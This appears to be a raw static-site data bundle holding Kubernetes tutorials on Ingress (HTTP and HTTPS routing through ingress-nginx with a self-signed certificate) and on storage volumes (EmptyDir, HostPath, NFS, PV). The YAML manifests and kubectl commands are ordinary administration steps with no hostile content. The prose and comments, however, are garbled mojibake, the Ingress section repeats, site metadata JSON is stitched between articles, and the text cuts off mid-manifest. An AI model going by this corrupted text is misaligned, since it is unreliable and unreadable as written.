ä»£ç\n\nåå»ºè¯ä¹¦\n\n# çæè¯ä¹¦\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com"\n\n# åå»ºå¯é¥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\nåå»º ingress-https.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretName: tls-secret # æå®ç§é¥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nNAME            HOSTS                                  ADDRESS         PORTS     AGE\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\nTLS:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nRules:\nHost              Path Backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# ä¸é¢å¯ä»¥éè¿æµè§å¨è®¿é®https://nginx.itheima.com:31335 å https://tomcat.itheima.com:31335æ¥æ¥çäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'# ingress ä»ç»\n\nå¨åé¢è¯¾ç¨ä¸­å·²ç»æå°ï¼service å¯¹éç¾¤ä¹å¤æ´é²æå¡çä¸»è¦æ¹å¼æä¸¤ç§ï¼noteport å loadbalancerï¼ä½æ¯è¿ä¸¤ç§æ¹å¼ï¼é½æä¸å®çç¼ºç¹ï¼\n\n * nodeport æ¹å¼çç¼ºç¹æ¯ä¼å ç¨å¾å¤éç¾¤æºå¨çç«¯å£ï¼é£ä¹å½éç¾¤æå¡åå¤çæ¶åï¼è¿ä¸ªç¼ºç¹å°±æåææ¾\n * lb æ¹å¼çç¼ºç¹æ¯æ¯ä¸ª service éè¦ä¸ä¸ª lbï¼æµªè´¹ãéº»ç¦ï¼å¹¶ä¸éè¦ kubernetes ä¹å¤è®¾å¤çæ¯æ\n\nåºäºè¿ç§ç°ç¶ï¼kubernetes æä¾äº ingress èµæºå¯¹è±¡ï¼ingress åªéè¦ä¸ä¸ª nodeport æèä¸ä¸ª lb å°±å¯ä»¥æ»¡è¶³æ´é²å¤ä¸ª service çéæ±ãå·¥ä½æºå¶å¤§è´å¦ä¸å¾è¡¨ç¤ºï¼\n\n\n\nå®éä¸ï¼ingress ç¸å½äºä¸ä¸ª 7 å±çè´è½½åè¡¡å¨ï¼æ¯ kubernetes å¯¹ååä»£ççä¸ä¸ªæ½è±¡ï¼å®çå·¥ä½åçç±»ä¼¼äº nginxï¼å¯ä»¥çè§£æå¨ ingress éå»ºç«è¯¸å¤æ å°è§åï¼ingress controller éè¿çå¬è¿äºéç½®è§åå¹¶è½¬åæ nginx çååä»£çéç½®ï¼ç¶åå¯¹å¤é¨æä¾æå¡ãå¨è¿éæä¸¤ä¸ªæ ¸å¿æ¦å¿µï¼\n\n * ingressï¼kubernetes ä¸­çä¸ä¸ªå¯¹è±¡ï¼ä½ç¨æ¯å®ä¹è¯·æ±å¦ä½è½¬åå° service çè§å\n * ingress controllerï¼å·ä½å®ç°ååä»£çåè´è½½åè¡¡çç¨åºï¼å¯¹ ingress å®ä¹çè§åè¿è¡è§£æï¼æ ¹æ®éç½®çè§åæ¥å®ç°è¯·æ±è½¬åï¼å®ç°æ¹å¼æå¾å¤ï¼æ¯å¦ nginx, contour, haproxy ç­ç­\n\ningressï¼ä»¥ nginx ä¸ºä¾ï¼çå·¥ä½åçå¦ä¸ï¼\n\n 1. ç¨æ·ç¼å ingress è§åï¼è¯´æåªä¸ªååå¯¹åº kubernetes éç¾¤ä¸­çåªä¸ª service\n 2. ingress æ§å¶å¨å¨ææç¥ ingress æå¡è§åçååï¼ç¶åçæä¸æ®µå¯¹åºç nginx ååä»£çéç½®\n 3. ingress æ§å¶å¨ä¼å°çæç nginx éç½®åå¥å°ä¸ä¸ªè¿è¡çç nginx æå¡ä¸­ï¼å¹¶å¨ææ´æ°\n 4. å°æ­¤ä¸ºæ­¢ï¼å¶å®çæ­£å¨å·¥ä½çå°±æ¯ä¸ä¸ª nginx äºï¼åé¨éç½®äºç¨æ·å®ä¹çè¯·æ±è½¬åè§å\n\n\n\n\n# ingress ä½¿ç¨\n\n\n# ç¯å¢åå¤\n\næ­å»º ingress ç¯å¢\n\n# åå»ºæä»¶å¤¹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# è·åingress-nginxï¼æ¬æ¬¡æ¡ä¾ä½¿ç¨çæ¯0.30çæ¬\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# ä¿®æ¹mandatory.yamlæä»¶ä¸­çä»åº\n# ä¿®æ¹quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# ä¸ºquay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# åå»ºingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# æ¥çingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nname                                           ready   status    restarts   age\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     running   0          12h\n\n# æ¥çservice\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nname            type       cluster-ip     external-ip   port(s)                      age\ningress-nginx   nodeport   10.98.75.163   <none>        80:32240/tcp,443:31335/tcp   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nåå¤ service å pod\nä¸ºäºåé¢çå®éªæ¯è¾æ¹ä¾¿ï¼åå»ºå¦ä¸å¾æç¤ºçæ¨¡å\n\n\n\nåå»º tomcat-nginx.yaml\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n---\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerport: 8080\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 80\n    targetport: 80\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 8080\n    targetport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get svc -n dev\nname             type        cluster-ip   external-ip   port(s)    age\nnginx-service    clusterip   none         <none>        80/tcp     48s\ntomcat-service   clusterip   none         <none>        8080/tcp   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# http ä»£ç\n\nåå»º ingress-http.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nname           hosts                                  address   ports   age\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nrules:\nhost                path  backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# æ¥ä¸æ¥,å¨æ¬å°çµèä¸éç½®hostæä»¶,è§£æä¸é¢çä¸¤ä¸ªååå°192.168.109.100(master)ä¸\n# ç¶å,å°±å¯ä»¥åå«è®¿é®tomcat.itheima.com:32240  å  nginx.itheima.com:32240 æ¥çææäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# https ä»£ç\n\nåå»ºè¯ä¹¦\n\n# çæè¯ä¹¦\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/c=cn/st=bj/l=bj/o=nginx/cn=itheima.com"\n\n# åå»ºå¯é¥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\nåå»º ingress-https.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretname: tls-secret # æå®ç§é¥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# åå»º\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nname            hosts                                  address         ports     age\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\ntls:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nrules:\nhost              path backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# ä¸é¢å¯ä»¥éè¿æµè§å¨è®¿é®https://nginx.itheima.com:31335 å https://tomcat.itheima.com:31335æ¥æ¥çäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0}},{title:"kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼",frontmatter:{title:"kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/610",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/610.kubernetes(%E5%8D%81%E4%B8%80)%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E6%8C%82%E8%BD%BD%E5%8D%B7%E7%AE%A1%E7%90%86%EF%BC%89.html",relativePath:"01.è¿ç»´/60.Kubernetes/610.kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼.md",key:"v-4fcd330d",path:"/kubernetes/610/",headers:[{level:2,title:"åºæ¬å­å¨",slug:"åºæ¬å­å¨",normalizedTitle:"åºæ¬å­å¨",charIndex:419},{level:3,title:"EmptyDir",slug:"emptydir",normalizedTitle:"emptydir",charIndex:353},{level:3,title:"HostPath",slug:"hostpath",normalizedTitle:"hostpath",charIndex:362},{level:3,title:"NFS",slug:"nfs",normalizedTitle:"nfs",charIndex:371},{level:2,title:"é«çº§å­å¨",slug:"é«çº§å­å¨",normalizedTitle:"é«çº§å­å¨",charIndex:378},{level:3,title:"PV",slug:"pv",normalizedTitle:"pv",charIndex:383},{level:3,title:"PVC",slug:"pvc",normalizedTitle:"pvc",charIndex:386},{level:3,title:"çå½å¨æ",slug:"çå½å¨æ",normalizedTitle:"çå½å¨æ",charIndex:11},{level:2,title:"éç½®å­å¨",slug:"éç½®å­å¨",normalizedTitle:"éç½®å­å¨",charIndex:393},{level:3,title:"ConfigMap",slug:"configmap",normalizedTitle:"configmap",charIndex:398},{level:3,title:"Secret",slug:"secret",normalizedTitle:"secret",charIndex:408}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"åºæ¬å­å¨ EmptyDir HostPath NFS é«çº§å­å¨ PV PVC çå½å¨æ éç½®å­å¨ ConfigMap Secret",content:'å¨åé¢å·²ç»æå°ï¼å®¹å¨ççå½å¨æå¯è½å¾ç­ï¼ä¼è¢«é¢ç¹å°åå»ºåéæ¯ãé£ä¹å®¹å¨å¨éæ¯æ¶ï¼ä¿å­å¨å®¹å¨ä¸­çæ°æ®ä¹ä¼è¢«æ¸é¤ãè¿ç§ç»æå¯¹ç¨æ·æ¥è¯´ï¼å¨æäºæåµä¸æ¯ä¸ä¹æçå°çãä¸ºäºæä¹åä¿å­å®¹å¨çæ°æ®ï¼kubernetes å¼å¥äº Volume çæ¦å¿µã\n\nVolume æ¯ Pod ä¸­è½å¤è¢«å¤ä¸ªå®¹å¨è®¿é®çå±äº«ç®å½ï¼å®è¢«å®ä¹å¨ Pod ä¸ï¼ç¶åè¢«ä¸ä¸ª Pod éçå¤ä¸ªå®¹å¨æè½½å°å·ä½çæä»¶ç®å½ä¸ï¼kubernetes éè¿ Volume å®ç°åä¸ä¸ª Pod ä¸­ä¸åå®¹å¨ä¹é´çæ°æ®å±äº«ä»¥åæ°æ®çæä¹åå­å¨ãVolume ççå½å®¹å¨ä¸ä¸ Pod ä¸­åä¸ªå®¹å¨ççå½å¨æç¸å³ï¼å½å®¹å¨ç»æ­¢æèéå¯æ¶ï¼Volume ä¸­çæ°æ®ä¹ä¸ä¼ä¸¢å¤±ã\n\nkubernetes ç Volume æ¯æå¤ç§ç±»åï¼æ¯è¾å¸¸è§çæä¸é¢å ä¸ªï¼\n\n * ç®åå­å¨ï¼EmptyDirãHostPathãNFS\n * é«çº§å­å¨ï¼PVãPVC\n * éç½®å­å¨ï¼ConfigMapãSecret\n\n\n# åºæ¬å­å¨\n\n\n# EmptyDir\n\nEmptyDir æ¯æåºç¡ç Volume ç±»åï¼ä¸ä¸ª EmptyDir å°±æ¯ Host ä¸çä¸ä¸ªç©ºç®å½ã\n\nEmptyDir æ¯å¨ Pod è¢«åéå° Node æ¶åå»ºçï¼å®çåå§åå®¹ä¸ºç©ºï¼å¹¶ä¸æ é¡»æå®å®¿ä¸»æºä¸å¯¹åºçç®å½æä»¶ï¼å ä¸º kubernetes ä¼èªå¨åéä¸ä¸ªç®å½ï¼å½ Pod éæ¯æ¶ï¼ EmptyDir ä¸­çæ°æ®ä¹ä¼è¢«æ°¸ä¹å é¤ã EmptyDir ç¨éå¦ä¸ï¼\n\n * ä¸´æ¶ç©ºé´ï¼ä¾å¦ç¨äºæäºåºç¨ç¨åºè¿è¡æ¶æéçä¸´æ¶ç®å½ï¼ä¸æ é¡»æ°¸ä¹ä¿ç\n * ä¸ä¸ªå®¹å¨éè¦ä»å¦ä¸ä¸ªå®¹å¨ä¸­è·åæ°æ®çç®å½ï¼å¤å®¹å¨å±äº«ç®å½ï¼\n\næ¥ä¸æ¥ï¼éè¿ä¸ä¸ªå®¹å¨ä¹é´æä»¶å±äº«çæ¡ä¾æ¥ä½¿ç¨ä¸ä¸ EmptyDirã\n\nå¨ä¸ä¸ª Pod ä¸­åå¤ä¸¤ä¸ªå®¹å¨ nginx å busyboxï¼ç¶åå£°æä¸ä¸ª Volume åå«æå¨å°ä¸¤ä¸ªå®¹å¨çç®å½ä¸­ï¼ç¶å nginx å®¹å¨è´è´£å Volume ä¸­åæ¥å¿ï¼busybox ä¸­éè¿å½ä»¤å°æ¥å¿åå®¹è¯»å°æ§å¶å°ã\n\n\n\nåå»ºä¸ä¸ª volume-emptydir.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:  # å°logs-volumeæå¨å°nginxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /var/log/nginx\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # åå§å½ä»¤ï¼å¨æè¯»åæå®æä»¶ä¸­åå®¹\n    volumeMounts:  # å°logs-volume æå¨å°busyboxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /logs\n    - name: logs-volume\n      mountPath: /logs\n  volumes: # å£°ævolumeï¼ nameä¸ºlogs-volumeï¼ç±»åä¸ºemptyDir\n  - name: logs-volume\n    emptyDir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE      IP       NODE   ...... \nvolume-emptydir       2/2     Running   0          97s   10.42.2.9   node1  ......\n\n# éè¿podIpè®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# éè¿kubectl logså½ä»¤æ¥çæå®å®¹å¨çæ åè¾åº\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# HostPath\n\nEmptyDir ä¸­æ°æ®ä¸ä¼è¢«æä¹åï¼å®ä¼éç Pod çç»æèéæ¯ï¼å¦ææ³ç®åçå°æ°æ®æä¹åå°ä¸»æºä¸­ï¼å¯ä»¥éæ© HostPathã\n\nHostPath å°±æ¯å° Node ä¸»æºä¸­ä¸ä¸ªå®éç®å½æå¨å° Pod ä¸­ï¼ä»¥ä¾å®¹å¨ä½¿ç¨ï¼è¿æ ·çè®¾è®¡å°±å¯ä»¥ä¿è¯ Pod éæ¯äºï¼ä½æ¯æ°æ®ä¾æ®å¯ä»¥å­å¨äº Node ä¸»æºä¸ã\n\n\n\nåå»ºä¸ä¸ª volume-hostpath.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    hostPath: \n      path: /root/logs #å®¿ä¸»æºç®å½\n      type: DirectoryOrCreate  # ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> å³äº type çå¼çä¸ç¹è¯´æï¼\n> DirectoryOrCreate ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> Directory ç®å½å¿é¡»å­å¨\n> FileOrCreate æä»¶å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> File æä»¶å¿é¡»å­å¨\n> Socket unix å¥æ¥å­å¿é¡»å­å¨\n> CharDevice å­ç¬¦è®¾å¤å¿é¡»å­å¨\n> BlockDevice åè®¾å¤å¿é¡»å­å¨\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# æ¥çPod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE   IP             NODE   ......\npod-volume-hostpath   2/2     Running   0          16s   10.42.2.10     node1  ......\n\n#è®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# æ¥ä¸æ¥å°±å¯ä»¥å»hostç/root/logsç®å½ä¸æ¥çå­å¨çæä»¶äº\n###  æ³¨æ: ä¸é¢çæä½éè¦å°Podæå¨çèç¹è¿è¡ï¼æ¡ä¾ä¸­æ¯node1ï¼\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# åæ ·çéçï¼å¦æå¨æ­¤ç®å½ä¸åå»ºä¸ä¸ªæä»¶ï¼å°å®¹å¨ä¸­ä¹æ¯å¯ä»¥çå°ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> æ³¨æï¼Pod è¢« k8s é¨ç½²å¨åªä¸ª Nodeï¼æä»¶å°±å¨é£ä¸ª Node ä¸æè½½\n\n\n# NFS\n\nHostPath å¯ä»¥è§£å³æ°æ®æä¹åçé®é¢ï¼ä½æ¯ä¸æ¦ Node èç¹æéäºï¼Pod å¦æè½¬ç§»å°äºå«çèç¹ï¼åä¼åºç°é®é¢äºï¼æ­¤æ¶éè¦åå¤åç¬çç½ç»å­å¨ç³»ç»ï¼æ¯è¾å¸¸ç¨çç¨ NFSãCIFSã\n\nNFS æ¯ä¸ä¸ªç½ç»æä»¶å­å¨ç³»ç»ï¼å¯ä»¥æ­å»ºä¸å° NFS æå¡å¨ï¼ç¶åå° Pod ä¸­çå­å¨ç´æ¥è¿æ¥å° NFS ç³»ç»ä¸ï¼è¿æ ·çè¯ï¼æ è®º Pod å¨èç¹ä¸æä¹è½¬ç§»ï¼åªè¦ Node è· NFS çå¯¹æ¥æ²¡é®é¢ï¼æ°æ®å°±å¯ä»¥æåè®¿é®ã\n\n\n\n1ï¼é¦åè¦åå¤ nfs çæå¡å¨ï¼è¿éä¸ºäºç®åï¼ç´æ¥æ¯ master èç¹å nfs æå¡å¨\n\n# å¨nfsä¸å®è£nfsæå¡\n[root@nfs ~]# yum install nfs-utils -y\n\n# åå¤ä¸ä¸ªå±äº«ç®å½\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# å°å±äº«ç®å½ä»¥è¯»åæéæ´é²ç»192.168.5.0/24ç½æ®µä¸­çææä¸»æº\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# å¯å¨nfsæå¡\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2ï¼æ¥ä¸æ¥ï¼è¦å¨çæ¯ä¸ª node èç¹ä¸é½å®è£ä¸ nfsï¼è¿æ ·çç®çæ¯ä¸ºäº node èç¹å¯ä»¥é©±å¨ nfs è®¾å¤\n\n# å¨nodeä¸å®è£nfsæå¡ï¼æ³¨æä¸éè¦å¯å¨\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3ï¼æ¥ä¸æ¥ï¼å°±å¯ä»¥ç¼å pod çéç½®æä»¶äºï¼åå»º volume-nfs.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfsæå¡å¨å°å\n      path: /root/data/nfs #å±äº«æä»¶è·¯å¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4ï¼æåï¼è¿è¡ä¸ podï¼è§å¯ç»æ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\nvolume-nfs        2/2     Running   0          2m9s\n\n# æ¥çnfsæå¡å¨ä¸çå±äº«ç®å½ï¼åç°å·²ç»ææä»¶äº\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# é«çº§å­å¨\n\nåé¢å·²ç»å­¦ä¹ äºä½¿ç¨ NFS æä¾å­å¨ï¼æ­¤æ¶å°±è¦æ±ç¨æ·ä¼æ­å»º NFS ç³»ç»ï¼å¹¶ä¸ä¼å¨ yaml éç½® nfsãç±äº kubernetes æ¯æçå­å¨ç³»ç»æå¾å¤ï¼è¦æ±å®¢æ·å¨é½ææ¡ï¼æ¾ç¶ä¸ç°å®ãä¸ºäºè½å¤å±è½åºå±å­å¨å®ç°çç»èï¼æ¹ä¾¿ç¨æ·ä½¿ç¨ï¼ kubernetes å¼å¥ PV å PVC ä¸¤ç§èµæºå¯¹è±¡ã\n\nPVï¼Persistent Volumeï¼æ¯æä¹åå·çææï¼æ¯å¯¹åºå±çå±äº«å­å¨çä¸ç§æ½è±¡ãä¸è¬æåµä¸ PV ç± kubernetes ç®¡çåè¿è¡åå»ºåéç½®ï¼å®ä¸åºå±å·ä½çå±äº«å­å¨ææ¯æå³ï¼å¹¶éè¿æä»¶å®æä¸å±äº«å­å¨çå¯¹æ¥ã\n\nPVCï¼Persistent Volume Claimï¼æ¯æä¹å·å£°æçææï¼æ¯ç¨æ·å¯¹äºå­å¨éæ±çä¸ç§å£°æãæ¢å¥è¯è¯´ï¼PVC å¶å®å°±æ¯ç¨æ·å kubernetes ç³»ç»ååºçä¸ç§èµæºéæ±ç³è¯·ã\n\n\n\nä½¿ç¨äº PV å PVC ä¹åï¼å·¥ä½å¯ä»¥å¾å°è¿ä¸æ­¥çç»åï¼\n\n * å­å¨ï¼å­å¨å·¥ç¨å¸ç»´æ¤\n * PVï¼ kubernetes ç®¡çåç»´æ¤\n * PVCï¼kubernetes ç¨æ·ç»´æ¤\n\n\n# PV\n\nPV æ¯å­å¨èµæºçæ½è±¡ï¼ä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiVersion: v1  \nkind: PersistentVolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # å­å¨ç±»åï¼ä¸åºå±çæ­£å­å¨å¯¹åº\n  capacity:  # å­å¨è½åï¼ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½®\n    storage: 2Gi\n  accessModes:  # è®¿é®æ¨¡å¼\n  storageClassName: # å­å¨ç±»å«\n  persistentVolumeReclaimPolicy: # 